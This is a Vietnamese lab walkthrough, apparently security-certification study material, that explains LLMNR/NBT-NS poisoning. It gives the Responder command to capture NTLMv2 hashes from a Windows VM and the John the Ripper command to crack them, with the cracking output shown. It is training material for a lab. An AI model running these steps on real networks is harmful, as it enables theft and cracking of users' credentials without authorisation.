# LLMNR/NBT-NS
Link-Local Multicast Name Resolution (LLMNR) và Netbios Name Service (NBT-NS) là hai thành phần của máy tính Microsoft Windows. LLMNR được giới thiệu trong Windows Vista và là phiên bản kế nhiệm của NBT-NS.

Khi yêu cầu máy chủ tên DNS thất bại, Link-Local Multicast Name Resolution (LLMNR) và Net-BIOS Name Service (NBT-NS) được sử dụng bởi máy Windows như một phương án dự phòng. Nếu tên DNS vẫn chưa được phân giải, Windows thực hiện một broadcast UDP không xác thực tới toàn bộ mạng. Bất kỳ máy tính giả mạo nào, tuyên bố là máy chủ sẽ gửi phản hồi và thu thập thông tin xác thực của mục tiêu trong quá trình xác thực.

**Tấn công giả mạo LLMNR/NBT-NS** là một cuộc tấn công mạng nội bộ cổ điển vẫn hoạt động, do nhận thức thấp và thực tế là nó được bật theo mặc định trong Windows.

![LLMNR spoofing](https://www.verifyit.nl/wp/wp-content/uploads/2016/12/llmnr_poison1.jpg)

LLMNR và NBT-NS được bật theo mặc định trong Windows và có thể được sử dụng để trích xuất mã băm mật khẩu từ người dùng. Có khả năng cao thu thập được thông tin xác thực của người dùng trên mạng nội bộ.

Bằng cách lắng nghe các yêu cầu broadcast LLMNR/NBT-NS, kẻ tấn công có thể giả mạo thành máy chủ và gửi phản hồi tuyên bố là máy chủ hợp pháp. Sau khi hệ thống nạn nhân chấp nhận kết nối, kẻ tấn công có thể thu thập thông tin xác thực người dùng của nạn nhân bằng cách sử dụng công cụ như Responder.py.

### Mục tiêu
* Thực hiện tấn công giả mạo LLMNR/NBT-NS.

### Yêu cầu
* Máy ảo Windows 10.
* Máy ảo Kali Linux.

## Sử dụng Responder
![responder banner](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/15fe651f34614ca182b0be697245a83c76e73a2b/responder-banner.png)

1. Khởi động và đăng nhập vào máy Windows 10. (Hãy chắc chắn chọn một mật khẩu phổ biến mà người dùng bình thường hay sử dụng - ví dụ **qwerty**).
2. Chuyển sang Kali Linux và mở cửa sổ Terminal.
3. Khởi động Responder để lắng nghe giao diện mạng. (Bạn có thể nhập `responder -h` để xem các tùy chọn có sẵn).

`responder -I eth0`

4. Bây giờ quay lại máy Windows 10 và giả sử bạn muốn truy cập một ổ đĩa mạng chia sẻ kết nối trong mạng của bạn. Khởi chạy **run** và nhập:

`\\ceh-tools`

![run](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/15fe651f34614ca182b0be697245a83c76e73a2b/run-cehtools.png)


## Thu thập và Giải mã Hash
Trên máy Kali, Responder bắt đầu thu thập nhật ký truy cập của máy Windows 10 như hình dưới đây:

![responder response](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/b5a69b422beda8c658e0610af852f006af262dcf/responder-1.png)

5. Truy cập **/usr/share/responder/logs/** và mở file cuối cùng được tạo bởi responder:

**SMB-NTLMv2-SSP-10.0.2.39.txt**
![responder log](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3e6cd9f2c6e3f1d27820e459b0d2625aa19cb229/responder-log-3.png "Responder Log file")

Đây là các hash của người dùng đã đăng nhập được thu thập bởi responder. Bây giờ hãy giải mã các hash này.

Để giải mã mật khẩu, chúng ta sẽ sử dụng [JohnTheRipper](https://www.openwall.com/john/).

6. Mở một cửa sổ Terminal mới và nhập `john` cùng đường dẫn đến nhật ký responder + tên file nhật ký của bạn (lưu ý tên file có thể khác với môi trường lab của bạn):

`john /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.2.39.txt`

```
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
qwerty           (Dummy)
qwerty           (Dummy)
qwerty           (Dummy)
qwerty           (Dummy)
4g 0:00:00:00 DONE 2/3 (2019-12-11 13:51) 26.66g/s 357713p/s 378293c/s 378293C/s 123456..random
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Các hash mật khẩu đã giải mã của người dùng Dummy được hiển thị trong kết quả trên.
